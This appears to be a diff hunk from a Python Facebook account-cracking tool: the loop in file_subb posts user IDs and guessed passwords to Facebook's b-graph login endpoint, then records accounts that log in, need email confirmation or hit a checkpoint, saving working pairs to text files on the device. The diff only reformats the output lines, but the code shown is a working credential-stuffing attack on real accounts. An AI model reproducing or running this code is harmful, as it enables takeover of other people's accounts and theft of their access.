@@ -285,16 +285,16 @@ def file_subb(uid,pwx):
             p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
             q=json.loads(p)
             if "session_key" in q:
-                print(f"\r\r{grn}  [GXDS-OK] {uid} | {ps}      ")
+                print(f"\r\r{grn}  [GXDS-OK] {uid}|{ps}")
                 open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in q:
-                print(f"\r\r{lgr} [GXDS-CE] {uid} | {ps}      ")
+                print(f"\r\r{lgr} [GXDS-CE] {uid}|{ps}")
                 open("/sdcard/gxds-ce.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
             elif "checkpoint" in q:
-                print(f"\r\r{lr}  [GXDS-CP] {uid} | {ps}      ")
+                print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                 cps.append(uid)
             else:
                 continue
